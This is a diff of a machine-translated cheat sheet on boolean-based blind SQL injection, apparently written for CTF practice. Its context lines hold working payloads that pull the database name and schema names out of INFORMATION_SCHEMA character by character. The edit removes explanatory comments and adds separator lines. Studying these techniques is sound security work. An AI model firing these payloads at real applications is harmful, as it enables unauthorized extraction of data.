@@ -143,11 +143,9 @@ NULLIF ()
 Boolean blinds - based on the response
 Submit a logic statement to infer a bit of information. Because injection requires (general) character-by-character execution, scripts or tools (such as the burp suite) need to be used. The following is:
 payload
-// i 用于提取每一个位，j 用于判断其对应的ASCII码值的范围。
-// k ，结合limit，选择偏移为k的行
-// **中可以填上其他的select语句，比如查询表名，列名，数据。一次类推。
-// SUBSTR() 也可以换成 SUBSTRING()
 
+-------------------      -----------------
+-------------------      -----------------
 ' OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) < j) #
 
 ' OR (SELECT ASCII(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) ) < j) #  
@@ -159,7 +157,7 @@ payload
 ' OR SUBSTR((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT k,1),i,1) < j #
 
 ...
-script
+
 Script use, visible: ctf blind using script points:
 Pay attention to the coding problem
 Pay attention to the exception handling
